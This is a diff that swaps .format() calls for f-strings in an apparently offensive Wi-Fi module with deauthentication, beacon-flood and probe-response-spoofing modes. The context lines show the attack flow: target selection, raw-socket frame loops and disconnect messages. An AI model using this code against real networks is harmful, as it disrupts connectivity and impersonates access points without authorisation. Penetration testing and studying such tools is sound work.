@@ -44,13 +44,13 @@ def _mac_to_bytes(mac_str: str) -> bytes:
     cleaned = mac_str.strip().replace("-", ":").lower()
     parts = cleaned.split(":")
     if len(parts) != 6:
-        raise ValueError("Invalid MAC address format: {}".format(mac_str))
+        raise ValueError(f"Invalid MAC address format: {mac_str}")
     return bytes(int(p, 16) for p in parts)
 
 
 def _bytes_to_mac(raw: bytes) -> str:
     """Convert 6 raw bytes to colon-separated MAC string."""
-    return ":".join("{:02x}".format(b) for b in raw)
+    return ":".join(f"{b:02x}" for b in raw)
 
 
 def _build_deauth_frame(bssid: bytes, client: bytes, reason: int = _REASON_DEAUTH_LEAVING) -> bytes:
@@ -221,9 +221,7 @@ class Exploit(Exploit):
             return raw_sock
         except (PermissionError, OSError) as exc:
             raise PermissionError(
-                "Cannot open raw socket on '{}': {} (requires root)".format(
-                    self.interface, exc
-                )
+                f"Cannot open raw socket on '{self.interface}': {exc} (requires root)"
             )
 
     def _send_frame(self, raw_sock: socket.socket, frame: bytes) -> bool:
@@ -257,7 +255,7 @@ class Exploit(Exploit):
                 sent += 1
 
             if (i + 1) % 25 == 0:
-                print_status("  Sent {}/{} deauth pairs...".format(i + 1, total))
+                print_status(f"  Sent {i + 1}/{total} deauth pairs...")
             time.sleep(0.001)
 
         return sent
@@ -269,13 +267,13 @@ class Exploit(Exploit):
 
         for i in range(total):
             fake_mac = bssid[:3] + os.urandom(3)
-            ssid = "FreeWiFi_{:04d}".format(i % 10000)
+            ssid = f"FreeWiFi_{i % 10000:04d}"
             frame = _build_beacon_frame(fake_mac, ssid, channel, seq_num=i)
             if self._send_frame(raw_sock, frame):
                 sent += 1
 
             if (i + 1) % 25 == 0:
-                print_status("  Beacons sent: {}/{}...".format(i + 1, total))
+                print_status(f"  Beacons sent: {i + 1}/{total}...")
             time.sleep(0.002)
 
         return sent
@@ -300,7 +298,7 @@ class Exploit(Exploit):
                 sent += 1
 
             if (i + 1) % 25 == 0:
-                print_status("  Probe responses sent: {}/{}...".format(i + 1, total))
+                print_status(f"  Probe responses sent: {i + 1}/{total}...")
             time.sleep(0.002)
 
         return sent
@@ -316,7 +314,7 @@ class Exploit(Exploit):
         if not iface:
             return False
 
-        sys_path = "/sys/class/net/{}".format(iface)
+        sys_path = f"/sys/class/net/{iface}"
         if not os.path.isdir(sys_path):
             return False
 
@@ -334,30 +332,30 @@ class Exploit(Exploit):
         total = int(self.count)
 
         if attack not in ("deauth", "beacon", "probe"):
-            print_error("Invalid attack_type '{}'. Use: deauth, beacon, probe".format(attack))
+            print_error(f"Invalid attack_type '{attack}'. Use: deauth, beacon, probe")
             return
 
-        print_status("Interface: {}".format(iface))
-        print_status("Attack type: {}".format(attack))
-        print_status("Frame count: {}".format(total))
+        print_status(f"Interface: {iface}")
+        print_status(f"Attack type: {attack}")
+        print_status(f"Frame count: {total}")
 
-        if not os.path.isdir("/sys/class/net/{}".format(iface)):
-            print_error("Interface '{}' does not exist".format(iface))
+        if not os.path.isdir(f"/sys/class/net/{iface}"):
+            print_error(f"Interface '{iface}' does not exist")
             return
 
         if not _detect_monitor_mode(iface):
-            print_error("Interface '{}' is not in monitor mode".format(iface))
+            print_error(f"Interface '{iface}' is not in monitor mode")
             print_info("Set monitor mode: airmon-ng start <interface>")
             return
 
         channel = _get_interface_channel(iface)
         if channel:
-            print_info("Current channel: {}".format(channel))
+            print_info(f"Current channel: {channel}")
 
         try:
             bssid = _mac_to_bytes(str(self.target))
         except ValueError as exc:
-            print_error("Invalid target BSSID: {}".format(exc))
+            print_error(f"Invalid target BSSID: {exc}")
             return
 
         client_str = str(self.client).strip()
@@ -365,12 +363,12 @@ class Exploit(Exploit):
             try:
                 client_mac = _mac_to_bytes(client_str)
             except ValueError as exc:
-                print_error("Invalid client MAC: {}".format(exc))
+                print_error(f"Invalid client MAC: {exc}")
                 return
         else:
             client_mac = _BROADCAST_MAC
 
-        print_status("Target BSSID: {}".format(_bytes_to_mac(bssid)))
+        print_status(f"Target BSSID: {_bytes_to_mac(bssid)}")
         if attack in ("deauth", "probe"):
             print_status("Client target: {}".format(
                 _bytes_to_mac(client_mac) if client_str else "broadcast"
@@ -379,34 +377,34 @@ class Exploit(Exploit):
         raw_sock = None
         try:
             raw_sock = self._open_raw_socket()
-            print_success("Raw socket opened on '{}'".format(iface))
+            print_success(f"Raw socket opened on '{iface}'")
 
             if attack == "deauth":
-                print_status("Sending {} deauthentication frame pairs...".format(total))
+                print_status(f"Sending {total} deauthentication frame pairs...")
                 sent = self._run_deauth(raw_sock, bssid, client_mac, total)
-                print_success("Deauth attack complete: {} frames transmitted".format(sent))
-                print_info("Clients should disconnect from {}".format(_bytes_to_mac(bssid)))
+                print_success(f"Deauth attack complete: {sent} frames transmitted")
+                print_info(f"Clients should disconnect from {_bytes_to_mac(bssid)}")
 
             elif attack == "beacon":
-                print_status("Sending {} fake beacon frames...".format(total))
+                print_status(f"Sending {total} fake beacon frames...")
                 sent = self._run_beacon_flood(raw_sock, bssid, total)
-                print_success("Beacon flood complete: {} frames transmitted".format(sent))
+                print_success(f"Beacon flood complete: {sent} frames transmitted")
                 print_info("Fake SSIDs should appear on nearby devices")
 
             elif attack == "probe":
                 if not client_str:
                     print_error("Probe response attack requires a client MAC (set 'client')")
                     return
-                print_status("Sending {} probe responses to {}...".format(total, _bytes_to_mac(client_mac)))
+                print_status(f"Sending {total} probe responses to {_bytes_to_mac(client_mac)}...")
                 sent = self._run_probe_response(raw_sock, bssid, client_mac, total)
-                print_success("Probe response spoofing complete: {} frames transmitted".format(sent))
+                print_success(f"Probe response spoofing complete: {sent} frames transmitted")
 
         except PermissionError as exc:
             print_error(str(exc))
             print_info("Run this module as root or with CAP_NET_RAW capability")
 
         except OSError as exc:
-            print_error("Socket error: {}".format(exc))
+            print_error(f"Socket error: {exc}")
 
         finally:
             if raw_sock:
